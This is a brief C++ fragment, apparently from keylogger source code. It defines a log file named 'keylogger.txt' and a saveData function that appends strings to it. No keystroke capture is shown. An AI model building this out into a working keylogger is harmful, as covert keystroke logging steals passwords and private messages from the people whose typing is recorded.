#include <fstream>
#include <windows.h>

#define LOG_FILE "keylogger.txt"

void saveData(std::string data){
    std::fstream logFile;

    logFile.open(LOG_FILE, std::ios::app);

    logFile << data;

    logFile.close();
}